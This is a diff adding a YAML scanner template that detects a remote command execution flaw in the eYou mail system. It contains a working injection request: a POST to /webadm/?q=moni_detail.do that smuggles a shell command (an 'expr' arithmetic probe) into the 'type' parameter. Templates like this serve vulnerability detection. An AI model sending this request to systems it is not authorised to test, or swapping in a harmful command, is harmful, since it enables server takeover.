@@ -1,0 +1,20 @@
+name: Eyou_Mail_system_moni_detail.do_RCE
+transport: http
+set: {}
+detail:
+  dock: app="Eyou-Mail-system"
+  product: Eyou-Mail-system
+  homepage: http://www.eyou.com/
+  impact: ''
+  description: A remote command execution vulnerability exists in the eYou email system,
+    allowing attackers to obtain server permissions.
+rules:
+  r1:
+    method: POST
+    path: /webadm/?q=moni_detail.do&action=gragh
+    follow_redirects: true
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: type=1%27|expr+100000000+-+1||%27
+    expression: response.status == 200 && response.body.bcontains(b'99999999')
+expression: r1()
